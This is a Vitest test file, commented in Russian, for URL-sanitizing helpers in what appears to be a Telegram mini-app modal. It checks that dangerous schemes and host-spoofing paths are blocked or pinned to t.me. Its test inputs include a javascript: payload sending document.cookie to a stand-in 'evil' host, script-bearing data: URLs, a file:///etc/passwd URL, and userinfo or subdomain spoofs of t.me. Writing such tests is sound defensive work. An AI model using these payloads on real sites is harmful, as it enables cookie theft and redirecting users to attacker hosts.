import { describe, it, expect } from 'vitest'
import { safeAppUrl, tgLinkUrl, frameOriginOf } from './WebAppModal'

// SEC-1: URL mini-app контролирует бот и идёт в src iframe (sandbox с
// allow-same-origin). Разрешаем только http/https; всё остальное — about:blank,
// иначе javascript:/data: исполнились бы в origin приложения.
describe('safeAppUrl', () => {
  it('пропускает http/https без изменений', () => {
    expect(safeAppUrl('https://app.example/mini')).toBe('https://app.example/mini')
    expect(safeAppUrl('http://app.example/x?y=1')).toBe('http://app.example/x?y=1')
  })

  it('блокирует javascript:/data:/прочие схемы → about:blank', () => {
    expect(safeAppUrl('javascript:fetch("//evil/"+document.cookie)')).toBe('about:blank')
    expect(safeAppUrl('data:text/html,<script>alert(1)</script>')).toBe('about:blank')
    expect(safeAppUrl('vbscript:msgbox(1)')).toBe('about:blank')
    expect(safeAppUrl('file:///etc/passwd')).toBe('about:blank')
    expect(safeAppUrl('tg://resolve?domain=x')).toBe('about:blank')
  })

  it('невалидный URL → about:blank', () => {
    expect(safeAppUrl('')).toBe('about:blank')
    expect(safeAppUrl('   ')).toBe('about:blank')
    expect(safeAppUrl('http://')).toBe('about:blank')
  })

  it('регистр схемы не обходит фильтр', () => {
    expect(safeAppUrl('JavaScript:alert(1)')).toBe('about:blank')
  })
})

// SEC-4: web_app_open_tg_link.path_full задаёт бот — не должен увести с t.me.
describe('tgLinkUrl', () => {
  it('нормальный путь остаётся на t.me', () => {
    expect(tgLinkUrl('/resolve?domain=x')).toBe('https://t.me/resolve?domain=x')
    expect(tgLinkUrl('resolve?domain=x')).toBe('https://t.me/resolve?domain=x')
    expect(tgLinkUrl('/@durov')).toBe('https://t.me/@durov')
  })

  it('поддомен-спуф не уводит с t.me', () => {
    // ".evil.com/x" без нормализации дал бы https://t.me.evil.com/x
    expect(tgLinkUrl('.evil.com/x')).toBe('https://t.me/.evil.com/x')
    expect(new URL(tgLinkUrl('.evil.com/x')).origin).toBe('https://t.me')
  })

  it('userinfo-спуф не уводит на чужой хост', () => {
    // "@evil.com" без нормализации дал бы https://t.me@evil.com (origin evil.com)
    expect(new URL(tgLinkUrl('@evil.com')).origin).toBe('https://t.me')
    // "//evil.com" (protocol-relative) тоже прижимается к t.me
    expect(new URL(tgLinkUrl('//evil.com/x')).origin).toBe('https://t.me')
  })
})

describe('frameOriginOf', () => {
  it('origin абсолютного http/https URL', () => {
    expect(frameOriginOf('https://app.example:8443/mini?x=1')).toBe('https://app.example:8443')
  })
  it('невалидный/относительный → пусто', () => {
    expect(frameOriginOf('about:blank')).toBe('null')
    expect(frameOriginOf('')).toBe('')
    expect(frameOriginOf('/relative')).toBe('')
  })
})
